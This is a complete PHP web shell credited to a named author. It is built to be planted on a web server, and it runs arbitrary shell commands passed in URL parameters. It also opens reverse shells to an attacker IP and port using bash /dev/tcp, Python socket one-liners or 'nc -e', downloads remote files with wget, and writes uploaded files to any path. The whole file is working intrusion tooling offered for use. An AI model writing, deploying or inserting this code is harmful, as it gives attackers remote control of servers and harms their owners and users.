<?php
// Author: Yavuz Sahbaz
// GitHub: https://github.com/YavuzSahbaz
header('Content-Type: text/plain');

// Display usage instructions
echo "// Author: Yavuz Sahbaz\n\n";
echo "// GitHub: https://github.com/YavuzSahbaz\n\n";
echo "Usage: NOTE ::!!!! SOMETIME IT WORK WITH '?' OR '&' IF PAGE NOT RESPONSE CHECK WITH '?' \ncmd.php&cmd=[COMMAND]\n";
echo "For reverse shell: cmd.php&revshell=[revshell_type]:[ATTACKER_IP]:[ATTACKER_PORT]\n";
echo "Supported reverse shell types: bash, python, python3, nc\n";
echo "For downloading a file: cmd.php&download=[URL]&filename=[FILENAME]\n";
echo "For uploading a file: cmd.php&upload&filepath=[FILE_PATH]\n";
echo "-------------------------------------------------\n";

// Check the available utilities on the system
$utilities = array('bash', 'python', 'python3', 'nc');
$available_utils = array();

foreach ($utilities as $utility) {
    if (shell_exec("which $utility")) {
        array_push($available_utils, $utility);
    }
}

echo "Available utilities on the system: " . implode(', ', $available_utils) . "\n\n";
// Run specified command
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    echo "Command output:\n";
    echo shell_exec($command);
} elseif (isset($_GET['revshell'])) {
    list($revshell_type, $attacker_ip, $attacker_port) = explode(':', $_GET['revshell']);

    if (!empty($revshell_type) && !empty($attacker_ip) && !empty($attacker_port)) {
        switch ($revshell_type) {
            case 'bash':
                $revshell = "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1";
                break;
            case 'python':
                $revshell = "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$attacker_ip\",$attacker_port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                break;
            case 'python3':
                $revshell = "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$attacker_ip\",$attacker_port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                break;
            case 'nc':
                $revshell = "nc -e /bin/sh $attacker_ip $attacker_port";
                break;
            default:
                echo "Unsupported reverse shell type.\n";
                exit;
        }

        shell_exec($revshell);
    } else {
        echo "Invalid reverse shell type, IP address or port number.\n";
    }
} elseif (isset($_GET['download'])) {
    $url = $_GET['download'];
    $filename = $_GET['filename'];
    if (!empty($url) && !empty($filename)) {
        $download = shell_exec("wget -O $filename $url");
        echo "File downloaded: " . $filename . "\n";
    } else {
        echo "Invalid URL or filename for file download.\n";
    }
} elseif (isset($_GET['upload'])) {
    if (isset($_GET['filepath'])) {
        $filepath = $_GET['filepath'];
        if (!empty($filepath)) {
            if (is_uploaded_file($_FILES['file']['tmp_name'])) {
                if (move_uploaded_file($_FILES['file']['tmp_name'], $filepath)) {
                    echo "File uploaded: " . $filepath . "\n";

                } else {
                    echo "Error uploading the file.\n";
                }
            } else {
                echo "No file found for uploading.\n";
            }
        } else {
            echo "Invalid file path for file upload.\n";
        }
    } else {
        echo "Specify the file path for uploading the file using the 'filepath' parameter.\n";
    }
}
?>


